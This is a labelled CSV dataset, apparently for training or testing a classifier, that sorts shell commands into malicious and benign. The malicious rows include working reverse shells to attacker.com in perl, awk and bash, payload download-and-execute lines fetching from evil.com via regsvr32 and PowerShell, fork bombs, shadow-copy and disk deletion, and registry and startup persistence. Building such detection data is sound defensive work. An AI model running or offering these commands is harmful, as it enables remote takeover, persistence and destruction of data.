command,label
shutdown /r /f /t 0,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
nohup cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
finger user --help,benign
fdisk -l,benign
sudo ls -la,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");' >/dev/null",malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll >/dev/null,malicious
chmod 777 /etc/shadow 2>&1,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ >/dev/null,malicious
(reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe),malicious
:(){ :|:& };:,malicious
python --version,benign
uptime -v,benign
cmd /c del /q /s C:\* 2>&1,malicious
:(){ :|:& };: &,malicious
uptime,benign
net localgroup administrators hacker /add,malicious
service apache2 status,benign
ncat -lvp 443 -e cmd.exe,malicious
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
vssadmin delete shadows /all /quiet,malicious
last,benign
rsync -av /src/ /dst/,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
nc -l -p 4444 -e /bin/bash,malicious
uptime,benign
wget https://example.com/file.txt | head -5,benign
du -sh /var/log --help,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
sort data.txt,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon &,malicious
git pull origin main,benign
docker ps > output.txt,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
:(){ :|:& };:,malicious
cat /etc/passwd,benign
:(){ :|:& };: 2>&1,malicious
